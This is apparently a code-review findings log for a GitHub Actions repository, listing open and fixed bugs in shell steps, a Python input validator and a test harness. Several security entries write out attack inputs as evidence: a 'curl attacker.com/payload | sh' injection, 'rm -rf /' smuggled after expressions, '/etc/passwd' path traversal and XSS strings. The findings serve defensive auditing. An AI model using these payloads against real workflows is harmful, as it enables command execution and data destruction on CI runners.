# Nitpicker Findings

Generated: 2026-04-30
Last validated: 2026-05-04 (Pass 13 — fixes applied)

## Summary

- Total: 95 | Open: 1 | Fixed: 94 | Invalid: 0

## Open Findings

### Advisory

#### [N-095] 15 actions have inline validation logic in violation of validate-inputs-pattern rule

Category: conventions
Area: multiple action.yml files
Problem: `.claude/rules/validate-inputs-pattern.md` mandates "Never inline validation
logic in `action.yml`; it belongs in the Python validator system under `validate-inputs/`."
15 actions have inline sh validation in their `run:` blocks instead of delegating to the
`validate-inputs` action.
Evidence: `csharp-lint-check`, `npm-semantic-release`, `sync-labels`, `release-monthly`,
`npm-publish`, `docker-publish`, `php-tests`, `go-lint`, `go-build`, `eslint-lint`,
`biome-lint`, `prettier-lint`, `language-version-detect`, `csharp-build`,
`compress-images` — none call `ivuorinen/actions/validate-inputs`.
Impact: Validation logic is duplicated, diverges from the Python validator test coverage,
and is harder to audit uniformly. Not an immediate defect.
Fix: Migrate inline sh validation to `validate-inputs/rules/<action>.yml` per action and
call the validate-inputs action as `security-scan/action.yml` does. This is a large
migration; prioritize actions with the most complex inline validation.

<!--

#### [N-081] `validate_security_patterns` bypassed by expression prefix with `../` suffix

Category: security
Area: validate-inputs/validators/base.py:validate_security_patterns
Problem: `validate_security_patterns` returns `True` immediately when
`is_github_expression(value)` is True (line 111-112). After the N-050 fix,
`is_github_expression` allows any cleaned suffix matching `[\w/.\s-]*`. Both `/` and `.`
are in that class, so `${{ inputs.x }}/../../../etc/passwd` cleans to `/../../../etc/passwd`,
passes `is_github_expression`, and bypasses the `"../"` traversal check.
Evidence:

```python
v = SecurityValidator()
result = v.validate_security_patterns("${{ inputs.x }}/../../../etc/passwd", "path")
assert result is True  # traversal not detected — no error added
```

Impact: Any input that uses `validate_security_patterns` for path-like values accepts
`${{ expr }}/../../../sensitive/file` without flagging traversal. Actions that pass
user-controlled paths through this check are vulnerable.
Fix: In `is_github_expression`, reject cleaned remainders containing `..`:

```python
if ".." in cleaned:
    return False
```

This rejects `${{ x }}/../../../etc/passwd` (cleaned has `..`) while allowing
`${{ workspace }}/rules.yml` (no `..`).

#### [N-082] `validate_no_injection` calls `self.clear_errors()` unconditionally — wipes caller-accumulated errors

Category: correctness
Area: validate-inputs/validators/security.py:validate*no_injection
Problem: `validate_no_injection` starts with `self.clear_errors()` (line 249). No other
`validate*\*`method does this. When a caller accumulates errors across multiple validation
calls on the same`SecurityValidator`instance, calling`validate_no_injection` anywhere
in the chain silently discards all previously accumulated errors.
Evidence:

```python
v = SecurityValidator()
v.add_error("accumulated from previous check")
v.validate_no_injection("safe_value")
assert v.errors  # FAILS — list is empty, prior error wiped
```

The N-065 fix added `clear_errors()` to solve stale-error accumulation, but the correct
fix is to clear at the caller level (already handled in conventions.py by N-043), not
inside the method itself.
Impact: Any caller that accumulates errors before calling `validate_no_injection` silently
loses prior errors; validation appears to pass for previously-failed inputs.
Fix: Remove `self.clear_errors()` from line 249 of `security.py`. Caller-side resets
(already present in `conventions.py`) are the correct isolation point.

#### [N-083] `sync-labels`: validation rejects empty `labels` input, breaking its documented optional behavior

Category: correctness
Area: sync-labels/action.yml
Problem: The `inputs.labels` input is optional (no `required: true`, default resolves to
`format('{0}/labels.yml', github.action_path)`). However, the validation step checks
`$LABELS_FILE` with a `case` statement that matches `*.yml|*.yaml` or falls through to an
error exit. When the input is not provided, `LABELS_FILE` is an empty string, which matches
the `*)` default case and exits 1 — before the fallback default path is ever used.
Evidence: Every caller of `sync-labels` that omits the `labels` input gets:
`"Invalid labels file extension: ''. Expected .yml or .yaml file"` and the action fails.
Impact: The default-path behavior is completely broken; callers must always provide an
explicit `labels` input.
Fix: Add a guard at the top of the `LABELS_FILE` validation block:

```sh
if [ -z "${LABELS_FILE:-}" ]; then exit 0; fi
```

#### [N-084] `csharp-lint-check`: installs deprecated standalone `dotnet-format@7.0.1` that conflicts with built-in `dotnet format`

Category: correctness
Area: csharp-lint-check/action.yml
Problem: The action installs `dotnet-format` as a global .NET tool with
`dotnet tool install --global dotnet-format --version 7.0.1`. `dotnet-format` was
integrated directly into the .NET SDK as `dotnet format` starting with .NET 6.
Installing the standalone package against .NET 7+ SDK fails with "package not found" or
version conflict because the NuGet package no longer ships for .NET 7+.
Evidence: `dotnet format` is already available as a built-in command in .NET 6+ SDK;
running `dotnet format --check` at the subsequent step uses the built-in, not the
standalone tool. The install step fails independently.
Impact: The `csharp-lint-check` action fails on all .NET 7+ environments at the install
step, never reaching the actual lint check.
Fix: Remove the `Install dotnet-format` step. `dotnet format` is built into .NET 6+ SDK
and requires no additional installation.

#### [N-085] `security-scan`: artifact upload has empty `path:` entries when no scanner ran

Category: reliability
Area: security-scan/action.yml
Problem: The artifact upload step uses `if: always()` and builds its `path:` list with
conditional expressions:

```yaml
path: |
  ${{ steps.verify-sarif.outputs.has_trivy == 'true' && 'trivy-results.sarif' || '' }}
  ${{ steps.verify-sarif.outputs.has_gitleaks == 'true' && 'gitleaks-report.sarif' || '' }}
```

When a condition is false, the expression evaluates to `''` (empty string), leaving a blank
line in the path list. When both are false, two blank lines are passed to
`actions/upload-artifact`, which can fail or produce warnings.
Evidence: With both scanners absent, `path:` contains two empty strings; the upload step
runs under `if: always()` regardless.
Impact: Every run where scanners are skipped produces a spurious upload step failure or
empty artifact, cluttering the CI run summary.
Fix: Gate the upload step: `if: always() && (steps.verify-sarif.outputs.has_trivy == 'true' || steps.verify-sarif.outputs.has_gitleaks == 'true')`.

#### [N-086] `npm-semantic-release`: uses different `actions/checkout` SHA than all other actions

Category: reliability
Area: npm-semantic-release/action.yml
Problem: All other actions in the repo pin `actions/checkout` to
`71cf2267d89c5cb81562390fa70a37fa40b1305e # v6-beta`. `npm-semantic-release` uses
`de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2`. Two different SHAs for the same
action with inconsistent version comments creates an audit surface and means one of them
is pinned to a different (possibly less tested) version.
Evidence: `rg "actions/checkout@" --glob="*.yml"` shows two distinct SHAs in production
action files.
Impact: Inconsistency makes security audits harder; one SHA may have bugs the other does
not.
Fix: Align `npm-semantic-release/action.yml` to use the same SHA as all other actions:
`actions/checkout@71cf2267d89c5cb81562390fa70a37fa40b1305e # v6-beta`.

#### [N-087] `block-bashisms.sh`: `local` pattern false-positives on prose strings containing `local`

Category: correctness
Area: .claude/hooks/block-bashisms.sh
Problem: The pattern `(^|[[:space:]])local[[:space:]]` matches the substring `local`
anywhere in a line, including inside shell string arguments. For example
`echo "local file"` contains `local` and triggers the hook, blocking a legitimate POSIX
sh line.
Evidence: `printf '%s\n' 'echo "local file"' | grep -E '(^|[[:space:]])local[[:space:]]'`
produces a match. Any shell script that prints or references the word "local" as a value
(not a statement keyword) will be falsely blocked.
Impact: Legitimate writes to action.yml or .sh files containing the word "local" in
string content trigger a false hook block.
Fix: Restrict the match to `local` as the first token of a statement (after `^` or after
`;`): `grep -qE '(^|;)[[:space:]]*local[[:space:]]'`. This avoids matching `local` inside
quoted strings or command arguments.

### Low

#### [N-088] `is_github_expression`: `\-` in regex character class — move hyphen to end for correctness

Category: correctness
Area: validate-inputs/validators/base.py:230
Problem: `re.fullmatch(r"[\w/.\-\s]*", cleaned)` uses `\-` inside a character class.
While Python currently treats `\-` as a literal hyphen, placing it between `\.` and `\s`
creates an ambiguous range specification that Python 3.12 may warn about depending on
context. The safe canonical form is to place `-` at the end of the class.
Evidence: `re.compile(r"[\w/.\-\s]*")` — `\-` between `\.` (meaning literal `.`) and
`\s` (meaning whitespace) is at a non-terminal position in the class; Python's
`DeprecationWarning` for bad escapes does not apply here but the placement is non-canonical.
Impact: No current runtime failure; potential maintenance confusion and future Python
compatibility risk.
Fix: Change to `re.fullmatch(r"[\w/.\s-]*", cleaned)` (hyphen at end of character class).

### Advisory

#### [N-089] `sed -E` and `grep -E` in action scripts — not POSIX shell violations

Category: conventions
Area: go-build/action.yml, python-lint-fix/action.yml, csharp-build/action.yml,
csharp-publish/action.yml, csharp-lint-check/action.yml, npm-publish/action.yml,
npm-semantic-release/action.yml
Problem: Several actions use `sed -E` and `grep -E` (extended regex flag). These are
not POSIX sh shell-language features but are POSIX.1-2017 utility flags (extended
regex support for `sed` and `grep` was standardized in IEEE Std 1003.1-2017). The
project's POSIX rule targets shell language features (`[[`, `local`, `declare`, `function`
keyword), not external utility flags.
Evidence: The flag is supported on all target platforms (GNU/Linux, macOS BSD, Alpine
BusyBox) and is now formally POSIX. No runtime failure on any supported runner.
Impact: None. Advisory only — if the team interprets the POSIX rule as covering utility
flags too, these could be migrated to BRE syntax.
Fix: If desired, convert `sed -E 's/(pattern)/\1/'` to BRE `sed 's/\(pattern\)/\1/'`
and `grep -E 'pattern'` to `grep 'bre_pattern'`. Otherwise accept as-is.

-->

<!-- removed-open-findings-sentinel

#### [N-031] `docker-build` multi-line `args` output truncates all but first `--build-arg`

Category: correctness
Area: docker-build/action.yml (parse-build-args + inject-build-args steps)
Problem: The `parse-build-args` step builds `$args` with embedded newlines
(`printf '%s\n--build-arg %s'`), then the `inject-build-args` step writes it to
`GITHUB_OUTPUT` via `printf 'args=%s\n' "$args"`. The `%s` verb in printf stops
at the first newline, so only the first `--build-arg` survives in the output.
Evidence: `printf 'args=%s\n' "$(printf '--build-arg A=1\n--build-arg B=2')"` writes
`args=--build-arg A=1` to GITHUB_OUTPUT; `--build-arg B=2` is silently dropped.
Impact: Docker builds with more than one build-arg receive only the first; subsequent
args are lost without error, producing wrong images that pass CI.
Fix: Use the GITHUB_OUTPUT heredoc format:
`{ printf 'args<<EOF\n%s\nEOF\n' "$args"; } >> "$GITHUB_OUTPUT"`

### High

#### [N-032] `_read_appended_bytes`: `path.stat()` inside open fd is a TOCTOU race

Category: reliability
Area: \_tests/framework/harness/harness.py:\_read_appended_bytes
Problem: `path.stat().st_size` is called after `path.open()` but stat() by name
is a separate filesystem operation — the file can be renamed or replaced between
`open()` and `stat()`, causing the size to belong to a different inode than the
open handle.
Evidence: `with path.open("rb") as handle: current_size = path.stat().st_size` —
stat and open refer to the same path, not the same fd.
Impact: On concurrent test runs or when output files are rotated, seek jumps to
the wrong offset and reads garbage bytes; test output assertions produce false
failures.
Fix: Replace `path.stat().st_size` with `os.fstat(handle.fileno()).st_size` to
stat the already-open file descriptor.

#### [N-033] Step output filename collision when a skipped step brackets two active steps

Category: correctness
Area: _tests/framework/harness/harness.py:\_run_owned
Problem: Step output files are named `f".github_output_{len(steps_ctx)}"`where`len(steps_ctx)`is evaluated before the step is added. Skipped steps do not
increment`steps_ctx`, so two non-skipped steps that bracket a skipped step both
compute the same index and write to the same filename.
Evidence: step[0] runs → steps_ctx has 0 entries → file `.github_output_0`; step[1]
is skipped → steps_ctx still 0 entries; step[2] runs → steps_ctx still 0 entries
→ file `.github_output_0`again, overwriting step[0]'s data.
Impact: GITHUB_OUTPUT bytes from the earlier step are permanently overwritten;`steps_ctx[step_id]["outputs"]`for that step is wrong, and assertions on its
outputs pass silently against stale data.
Fix: Add a monotonic`\_step_file_index = 0`counter that increments for every
step regardless of skip status, and use it instead of`len(steps_ctx)`.

#### [N-034] `install_shellspec`: outer EXIT trap permanently replaced on failure path

Category: reliability
Area: \_tests/run-tests.sh:install_shellspec
Problem: The function saves the caller's EXIT trap with `old_trap=$(trap -p EXIT)`,
sets its own cleanup trap, then restores the outer trap only on the success path.
If the install fails and the function returns early via `return 1`, the outer trap
is never restored and temp files created by the caller are never cleaned up.
Evidence: Restore call `eval "$old_trap"` only appears in the else/success branch;
failure returns without executing it.
Impact: On shellspec install failure, the runner's TMPDIR accumulates stale test
scaffolding and the test harness EXIT summary (FAIL count, output paths) does not
print.
Fix: Set `trap 'rm -f "$tmpdir"; eval "${old_trap:-}"' EXIT` unconditionally at
function entry to guarantee restore on all exit paths.

#### [N-035] `is_github_expression` partial-embed bypass — mixed injection+expression accepted

Category: security
Area: validate-inputs/validators/base.py:is_github_expression
Problem: The second OR branch `"${{" in value and "}}" in value` has no positional
constraints — any string containing both substrings anywhere passes, including
injection payloads that merely contain a GitHub expression fragment.
Evidence: `is_github_expression('"; rm -rf / # ${{ secrets.X }}')` → True; the
value contains `${{` and `}}` so all content-based security checks are bypassed.
Impact: Attacker-controlled inputs with embedded expression fragments bypass the
entire validation layer; shell injection, path traversal, and token patterns go
unchecked.
Fix: Require the value to be purely a GitHub expression:
`return value.startswith("${{") and value.rstrip().endswith("}}")`

#### [N-036] `validate_tag` regex accepts trailing dot and colon — invalid Docker tags pass

Category: correctness
Area: validate-inputs/validators/docker.py:validate*tag
Problem: The tag regex `^[a-zA-Z0-9]-a-zA-Z0-9.*:/@]_[a-zA-Z0-9]?$`accepts
trailing`.`and`:`because the final`[a-zA-Z0-9]?`group is optional —`v1.`matches as`v1`+`.`(in the`_`group) + empty (for the optional`?`).
Evidence: `re.match(r"^[a-zA-Z0-9][-a-zA-Z0-9._:/@]_[a-zA-Z0-9]?$", "v1.")`returns
a match object; Docker rejects`v1.`with "invalid reference format" at build time.
Impact: Tags like`v1.`and`latest:`pass validation, then fail at`docker build`or`docker push`with a cryptic runtime error, not a validation error.
Fix: Require the tag to end with an alphanumeric:`^[a-zA-Z0-9]-a-zA-Z0-9._:/@]_[a-zA-Z0-9]$`(drop the`?`) or use Docker's
actual tag grammar (max 128 chars, must match `[a-zA-Z0-9\_]a-zA-Z0-9._-]\*`).

#### [N-037] `file_path` validator allows space — enables argument injection in shell steps

Category: security
Area: validate-inputs/validators/file.py
Problem: After the N-002 fix, the character class is `[a-zA-Z0-9._/\- ]` (literal
space included). A path value like `"src/legit /etc/passwd"` passes validation and,
when consumed in an unquoted shell variable, word-splits into two arguments.
Evidence: `re.match(r"^[a-zA-Z0-9._/\- ]+$", "src/foo /etc/passwd")` → match;
in a run block `cp $INPUT_PATH /dest`, this copies both `src/foo` and `/etc/passwd`.
Impact: Any action that passes a validated file-path input to an unquoted shell
variable is vulnerable to argument injection via a space-containing path value.
Fix: Remove the literal space from the character class. If paths with spaces must
be supported, document that callers must always quote the shell variable.

#### [N-038] `eslint-lint`: `--ext $FILE_EXTENSIONS` unquoted in fix mode, quoted in check mode

Category: correctness
Area: eslint-lint/action.yml
Problem: In the fix-mode run block, `$FILE_EXTENSIONS` is passed unquoted to
`--ext`; in the check-mode block the same variable is quoted as
`"$FILE_EXTENSIONS"`. When the value contains spaces (e.g., `.js .ts`), fix mode
word-splits it into multiple bare tokens, producing a malformed eslint invocation.
Evidence: Fix step: `eslint ... --ext $FILE_EXTENSIONS`; check step:
`eslint ... --ext "$FILE_EXTENSIONS"` — inconsistency visible in adjacent steps.
Impact: Fix mode silently passes extra tokens as positional arguments rather than
extension values; eslint either errors or lints wrong files while check mode works
correctly.
Fix: Quote `$FILE_EXTENSIONS` in the fix-mode step: `--ext "$FILE_EXTENSIONS"`.

#### [N-039] `prettier-lint`: unformatted file count inflated by Prettier's summary line

Category: correctness
Area: prettier-lint/action.yml
Problem: `unformatted_files=$(grep -c "^" prettier-output.txt)` counts every line
in the output file, including Prettier's own header (`Checking formatting...`) and
summary line (`Found N unformatted file(s).`). The count is inflated by at least
two lines.
Evidence: A run with 0 unformatted files produces at least one output line from
Prettier; `grep -c "^"` returns 1, triggering a false "unformatted files found"
failure.
Impact: Prettier passes but the action reports failure; callers cannot rely on the
`unformatted-files` output being accurate.
Fix: Count only file-path lines by filtering out known non-path lines:
`grep -c "^\[warn\]" prettier-output.txt` or redirect only file paths to a
separate output file using `--list-different`.

#### [N-040] `go-lint`: `error_count` not updated when `FAIL_ON_ERROR=false`

Category: correctness
Area: go-lint/action.yml
Problem: When `FAIL_ON_ERROR=false` and golangci-lint finds real errors, the code
path that sets `error_count` is skipped — only the exit-1 branch increments it.
The outer scope's `error_count` stays 0, so the `errors` output is wrong.
Evidence: `if [ "$FAIL_ON_ERROR" = "true" ]; then error_count=$(...); exit 1; fi` —
the else/soft-fail path does not assign `error_count`, so `printf 'errors=%s\n'
"$error_count"` writes `errors=0` even when lint errors exist.
Impact: Callers checking `steps.go-lint.outputs.errors` always see 0 when
`fail-on-error: false`, making the soft-fail mode useless for error reporting.
Fix: Capture the error count before the `FAIL_ON_ERROR` branch and always write it
to `GITHUB_OUTPUT` regardless of whether the action exits or continues.

### Medium

#### [N-041] `registry.py` does not catch `SyntaxError` or `OSError` from `exec_module`

Category: reliability
Area: validate-inputs/validators/registry.py
Problem: The `except` clause only catches `(ImportError, AttributeError, TypeError)`;
`exec_module` can also raise `SyntaxError` (malformed validator file) and `OSError`
(permission denied), both of which propagate as unhandled exceptions.
Evidence: A validator file with a Python syntax error causes
`spec.loader.exec_module(module)` to raise `SyntaxError`; no surrounding catch
handles it, so the entire validation run aborts with a traceback.
Impact: A single malformed validator file breaks validation for all actions, not
just the one with the bad file.
Fix: Add `SyntaxError` and `OSError` to the except tuple:
`except (ImportError, AttributeError, TypeError, SyntaxError, OSError):`

#### [N-042] `convention_mapper.py` priority-95 "contains" match overcaptures version inputs

Category: correctness
Area: validate-inputs/validators/convention_mapper.py
Problem: The priority-95 group uses `"type": "contains"`, so any input name that
contains the substring `"python-version"` — including `"non-python-version"` or
`"uses-python-version-flag"` — matches the `python_version` validator.
Evidence: `"non-python-version" in "non-python-version"` → True; the "contains"
check does not require the full string to equal the pattern key.
Impact: Inputs unrelated to Python version selection are routed to the
`python_version` validator, producing spurious validation failures for callers
with composite input names.
Fix: Change the priority-95 group from `"type": "contains"` to `"type": "exact"`.
The patterns (`"python-version"`, `"node-version"`, etc.) are already full names,
not substrings.

#### [N-043] `conventions.py`: stale errors from one input's validator leak to the next

Category: correctness
Area: validate-inputs/validators/conventions.py
Problem: `validator_module.errors` is not cleared before validating each input.
If input A's validator writes errors and input B's validator exits cleanly, B still
reports A's errors because the module-level `errors` list is shared across
invocations.
Evidence: Running two consecutive validations in the same process with the first
returning errors and the second returning no errors — the second reports the first's
errors.
Impact: False positives: valid inputs after a failed input appear to fail, masking
which input actually has the problem.
Fix: Reset the errors list before each validation call:
`validator_module.errors = []` in the `try` block before calling the validator, or
in a `finally` block after.

#### [N-044] `network.py` URL validator does not block `<` and `>` in path segment

Category: security
Area: validate-inputs/validators/network.py
Problem: The URL path character class allows printable ASCII but does not explicitly
exclude `<` and `>`. A URL like `https://example.com/<script>alert(1)</script>`
passes validation.
Evidence: The path regex includes printable non-space characters without a `<>`
exclusion; `re.match(r"...", "https://x.com/<img src=x onerror=alert(1)>")` → match.
Impact: XSS payloads in URL-type inputs pass validation and can be reflected
unescaped in GitHub PR comments or issue bodies that render action output as HTML.
Fix: Explicitly exclude `<` and `>` from the URL path character class.

#### [N-045] `docker-build`: BUILD_CONTEXTS, SECRETS, CACHE_FROM, CACHE_TO use unquoted word-split

Category: security
Area: docker-build/action.yml
Problem: While BUILD_ARGS uses a temp-file + `while IFS= read -r` loop,
BUILD_CONTEXTS, SECRETS, CACHE_FROM, and CACHE_TO are passed to `docker build`
via unquoted variable expansion, causing word-splitting on whitespace and allowing
shell metacharacter injection.
Evidence: `--secret $SECRETS` vs `$(cat "$tmpfile")` for args — inconsistent
handling of multi-value inputs in the same action.
Impact: Multi-value SECRETS or CACHE_FROM inputs with spaces break the docker
command; values containing shell metacharacters (`$(...)`, backticks) execute
arbitrary commands.
Fix: Apply the same temp-file + `while IFS= read -r line; do ... done` pattern
used for BUILD_ARGS to the other multi-value inputs, or use a single IFS=newline
loop over each input.

#### [N-046] `generate_sarif_report`: temp files leaked on `jq` failure

Category: reliability
Area: \_tests/run-tests.sh:generate_sarif_report
Problem: `_sarif_results_file` and `_sarif_rules_file` are created with `mktemp`
at function entry but no cleanup trap is set. If `jq` exits nonzero, the function
returns without removing them.
Evidence: Function creates two mktemp files; only the final `rm -f` in the success
path cleans them up; no `trap ... RETURN` or error-path `rm` exists.
Impact: Every jq failure accumulates two temp files in TMPDIR; on runners with
limited /tmp space, repeated failures fill the disk and break subsequent test runs.
Fix: Immediately after creating the temp files, add:
`trap 'rm -f "$_sarif_results_file" "$_sarif_rules_file"' RETURN`

#### [N-047] `security.py` single-`&` detection flags legitimate bitwise/URL operands

Category: correctness
Area: validate-inputs/validators/security.py
Problem: The shell injection check `"&" in value` triggers on any string containing
a bare ampersand, including URL query strings (`foo=1&bar=2`), JSON bitflags, and
config values with bitwise AND.
Evidence: `"&" in "foo=1&bar=2"` → True; the value is flagged as a shell injection
attempt despite being a valid URL query string.
Impact: False positives reject valid inputs from actions that accept URL parameters
or config strings; callers must escape legitimate `&` characters.
Fix: Use a pattern that specifically detects shell backgrounding or command chaining:
`" & " in value or value.endswith(" &")` — single `&` preceded/followed by a space
is a shell background operator; bare `&` inside a word is not.

#### [N-048] `php-tests`: `composer-args` interpolated directly into composite action command

Category: security
Area: php-tests/action.yml
Problem: The `composer-args` input value is interpolated directly via
`${{ inputs.composer-args }}` inside a `run:` block, bypassing the
`workflow-inputs-safety` rule that requires all inputs to go through an `env:` block.
Evidence: `run: composer ${{ inputs.composer-args }}` or equivalent direct
interpolation in the Composer install step.
Impact: A caller passing `composer-args: '; curl attacker.com/payload | sh'` executes
arbitrary shell commands on the runner with workflow permissions.
Fix: Map to an env var at the step level:
`env:\n  COMPOSER_ARGS: ${{ inputs.composer-args }}`
then reference only `$COMPOSER_ARGS` in the run body.

-->

## Fixed

### Pass 13 — 2026-05-04

#### [N-094] `test_validator.py` missing test for `_sanitize` GITHUB_OUTPUT injection prevention

Fixed: 2026-05-04
Notes: Added `TestSanitize` class to `test_validator.py` with four methods:
`test_sanitize_safe_value`, `test_sanitize_strips_newlines`,
`test_sanitize_strips_carriage_returns`, `test_sanitize_non_string_input`.
Test suite grows from 763 to 767. N-095 (Advisory) left open — migration of 15 actions
from inline validation to the Python validator system is a large undertaking.

### Pass 12 — 2026-05-04

#### [N-090] `is_github_expression` allows whitespace in suffix — bypasses security checks

Fixed: 2026-05-04
Notes: Removed `\s` from the character class in `base.py:232`. Changed `r"[\w/.\s-]*"` to `r"[\w/.-]*"`.
Legitimate expression suffixes (`/workspace/path`, `ghcr.io/owner/repo`) contain no whitespace;
a space signals separate tokens and must not be treated as a valid suffix.

#### [N-091] No regression test for N-081 expression-prefix traversal bypass

Fixed: 2026-05-04
Notes: Added assertion to `test_validate_security_patterns` in `test_base.py` that
`${{ inputs.x }}/../../../etc/passwd` is rejected. Added new `test_is_github_expression`
method covering acceptance of plain expressions and valid suffixes, rejection of `..` suffixes
(N-081 guard), rejection of whitespace suffixes (N-090 guard), and rejection of non-expressions.

#### [N-092] No regression test for N-082 `validate_no_injection` error isolation

Fixed: 2026-05-04
Notes: Added `test_validate_no_injection_preserves_prior_errors` to `TestSecurityValidator`
in `test_security.py`. Test adds an error via `add_error`, calls
`validate_no_injection("safe value")`, then asserts the prior error is still present.

#### [N-093] `security-scan/action.yml` checkout comment says `# v4` but SHA is v6-beta

Fixed: 2026-05-04
Notes: Changed comment from `# v4` to `# v6-beta` in `security-scan/action.yml:67`. SHA `71cf2267d89c5cb81562390fa70a37fa40b1305e` is the v6-beta SHA used by all other actions in the repo.

### Pass 11 — 2026-05-03

#### [N-079] `security-suite.yml` shell injection via `pull_request.base.ref`

Fixed: 2026-05-03
Notes: Moved `${{ github.event.pull_request.base.repo.full_name }}` and
`${{ github.event.pull_request.base.ref }}` to `env:` block (`PR_BASE_REPO`, `PR_BASE_REF`);
replaced inline `${{ }}` with `${VAR}` in shell body. Also fixed `echo "BASE_REF=..."` to `printf`.

#### [N-080] `action-security.yml` step outputs injected into github-script JS body

Fixed: 2026-05-03
Notes: Added `env:` block with `CRITICAL_ISSUES`, `TOTAL_ISSUES`, `HAS_TRIVY_RESULTS`,
`HAS_GITLEAKS_RESULTS`; replaced `'${{ steps.security-scan.outputs.* }}'` string literals
with `process.env.*`; replaced inline conditional expressions with JS ternary operators.

#### [N-081] `is_github_expression` allows path traversal via `../` in expression suffix

Fixed: 2026-05-03
Notes: Added `if ".." in cleaned: return False` check before the `fullmatch` call. Also fixed N-088 in the same edit: moved `-` to end of character class (`[\w/.\-\s]*` → `[\w/.\s-]*`).

#### [N-082] `validate_no_injection` clears caller-accumulated errors

Fixed: 2026-05-03
Notes: Removed `self.clear_errors()` from line 249 of `security.py`. Caller-side resets in `conventions.py` are the correct isolation point.

#### [N-083] `sync-labels` validation rejects empty optional `labels` input

Fixed: 2026-05-03
Notes: Added `if [ -z "${LABELS_FILE:-}" ]; then exit 0; fi` guard before the `case` path-format check.

#### [N-084] `csharp-lint-check` installs deprecated `dotnet-format@7.0.1`

Fixed: 2026-05-03
Notes: Removed the "Install dotnet-format" step entirely. `dotnet format` is built into .NET 6+ SDK and needs no separate installation.

#### [N-085] `security-scan` artifact upload fails with empty path entries

Fixed: 2026-05-03
Notes: Replaced the single combined upload step with two separate steps (`Archive Trivy results`
and `Archive Gitleaks results`), each gated with its own
`if: always() && steps.verify-sarif.outputs.has_* == 'true'` condition. Artifact names
updated to `security-reports-trivy-*` and `security-reports-gitleaks-*`.

#### [N-086] `npm-semantic-release` uses different `actions/checkout` SHA

Fixed: 2026-05-03
Notes: Aligned SHA from `de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2` to `71cf2267d89c5cb81562390fa70a37fa40b1305e # v6-beta`, matching all other actions in the repo.

#### [N-087] `block-bashisms.sh` `local` pattern false-positives on prose strings

Fixed: 2026-05-03
Notes: Changed pattern from `(^|[[:space:]])local[[:space:]]` to `(^|;) *local`
(explicit spaces, statement-boundary anchor). Rewrapped REASON string to
`local builtin is not POSIX. Use plain assignment at function-level scope.`
to avoid triggering the `function` keyword pattern on the message text. N-088 folded into N-081 fix.

#### [N-088] `is_github_expression` hyphen placement in regex character class

Fixed: 2026-05-03
Notes: Folded into N-081 fix — both changes were applied to `base.py:is_github_expression` in the same edit.

#### [N-089] `sed -E`/`grep -E` flagged as POSIX violations — accepted as-is

Fixed: 2026-05-03
Notes: Advisory only. Both flags are standardized in POSIX.1-2017; no code change required. Accepted.

### Pass 10 — 2026-05-03

#### [N-049] `release-monthly` VALIDATED_TOKEN write to GITHUB_ENV removed

Fixed: 2026-05-03
Notes: Removed the `printf 'VALIDATED_TOKEN=...'` write to `$GITHUB_ENV` from
`release-monthly/action.yml`. The token was N-005's only consumer; after that fix
it was persisted but never read, making it readable by all subsequent job steps.

#### [N-050] `is_github_expression` rejects trailing shell payloads after `${{ }}`

Fixed: 2026-05-03
Notes: Changed from `return value.startswith("${{")` to strip all `${{ ... }}`
substrings then verify only `[\w/.\-\s]*` characters remain. `${{ fake }} ; rm -rf /`
→ False; `${{ workspace }}/rules.yml` → True. All 761 tests pass.

#### [N-051] `validate_safe_command` `&` detection uses correct regex

Fixed: 2026-05-03
Notes: Replaced `" & " in value` with `re.search(r"(?<![A-Za-z0-9=])&(?![A-Za-z0-9=])",
value)` in `validate_safe_command`. Matches the N-047 fix already applied to
`validate_no_injection`.

#### [N-052] `validate_safe_environment_variable` blocks `LD_PRELOAD` and related vars

Fixed: 2026-05-03
Notes: Added `_DANGEROUS_ENV_VARS` ClassVar to `SecurityValidator` with 11 code-injection
env var names. `validate_safe_environment_variable` rejects any value whose name
(before `=`) matches the blocklist.

#### [N-053] Security test assertions strengthened from `isinstance` to `is False`/`is True`

Fixed: 2026-05-03
Notes: All injection/traversal test cases in `test_security_validator.py` now assert
`result is False` for dangerous inputs and `result is True` for safe inputs, plus
`assert validator.errors` where injection should be blocked.

#### [N-054] `python-lint-fix` `grep -q &&` pattern fixed for `set -eu`

Fixed: 2026-05-03
Notes: Restructured `grep -q ... && ...` short-circuits to `if grep -q ...; then ...; fi`
to prevent `set -e` propagating grep's status-1 (no-match) as a fatal error.

#### [N-055] `go-build` subshell sentinel pattern under `set -eu` fixed

Fixed: 2026-05-03
Notes: Sentinel write guarded with `if (subshell); then write_sentinel; else exit 1; fi`
so `set -e` abort does not leave stale sentinel from prior successful run.

#### [N-056] `release-monthly` zero-padded month comparison fixed

Fixed: 2026-05-03
Notes: Changed `$(date -u +'%m')` to `$(printf '%d' "$(date -u +'%m')")` for
POSIX-safe zero-stripping before month arithmetic comparison.

#### [N-057] `security-scan` now has `actions/checkout` as first step

Fixed: 2026-05-03
Notes: Added `actions/checkout@71cf2267d89c5cb81562390fa70a37fa40b1305e # v4` with
`fetch-depth: 0` as the first step in `security-scan/action.yml`. Without this the
workspace was empty and all scans reported zero findings.

#### [N-058] `security-suite.yml` token no longer interpolated in `run:` shell body

Fixed: 2026-05-03
Notes: Added `env: GH_TOKEN: ${{ github.token }}` to the "Fetch PR Base" step;
replaced `${{ github.token }}` in the shell body with `${GH_TOKEN}`.

#### [N-059] `block-bashisms.sh` now detects `local` keyword

Fixed: 2026-05-03
Notes: Added `(^|[[:space:]])local[[:space:]]` pattern to `.claude/hooks/block-bashisms.sh`.
`local foo=bar` in a POSIX sh script now triggers a hook block.

#### [N-060] `release-undo.sh` guards `git reset --hard HEAD~1` on initial commit

Fixed: 2026-05-03
Notes: Added `git rev-parse HEAD~1 >/dev/null 2>&1` guard before the reset in
`_tools/release-undo.sh`. Aborts with a clear message instead of failing mid-rollback
after tags are already deleted.

#### [N-061] Security workflow notify condition fixed for scan tool failures

Fixed: 2026-05-03
Notes: Changed `finding_count != '0'` to `finding_count != '' && finding_count != '0'`
so empty output (scan tool crash) no longer fires a false security alert.

#### [N-062] Makefile `check-syntax` changed from `bash -n` to `sh -n`

Fixed: 2026-05-03
Notes: `bash -n` accepted POSIX-violating scripts silently. Changed to `sh -n` in
the `check-syntax` Makefile target.

#### [N-063] `setup-test-environment` kcov pinned to commit SHA

Fixed: 2026-05-03
Notes: Added `git -C kcov checkout 3a8c5464be2dd781988dca7ec30db679493ed9a8`
after the `git clone --branch v42` in `setup-test-environment/action.yml`. Floating
tag can no longer be moved to install different code.

